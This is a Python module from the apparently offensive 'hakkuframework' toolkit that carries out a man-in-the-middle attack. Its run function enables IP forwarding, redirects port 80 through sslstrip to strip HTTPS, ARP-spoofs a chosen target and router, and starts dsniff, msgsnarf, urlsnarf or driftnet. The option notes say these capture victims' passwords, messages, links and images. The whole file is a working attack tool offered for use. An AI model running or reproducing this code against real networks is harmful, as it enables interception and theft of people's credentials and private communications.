#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

from core.hakkuframework import *
from core import colors
import subprocess
import os

conf = {
	"name": "mitm",
	"version": "1.0",
	"shortdesc": "man in the middle attack",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "26.4.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "dsniff", "driftnet", "sslstrip"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['eth0', 'network interface name']),
	('router', ['192.168.1.1', 'router ip address']),
	('target', ['192.168.1.2', 'target ip address']),
	('sniffer', ['dsniff', 'sniffer name (select from sniffer list)']),
	('ssl', ['true', 'SSLStrip, for SSL hijacking(true / false)']),
))

# Additional notes to options
option_notes = colors.green+' sniffers\t description'+colors.end+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	if variables['sniffer'][0] =='dsniff':
		selected_sniffer = 'dsniff -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='msgsnarf':
		selected_sniffer = 'msgsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='urlsnarf':
		selected_sniffer = 'urlsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='driftnet':
			selected_sniffer = 'driftnet -i ' + variables['interface'][0]
	else:
		printError('invalid sniffer!')

	if variables['ssl'][0] =='true':
		subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("IP forwarding...")
	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("ARP spoofing...")
	arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
	subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
	subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("sniffer starting...")
	printInfo("ctrl + c to end")
	os.system(selected_sniffer)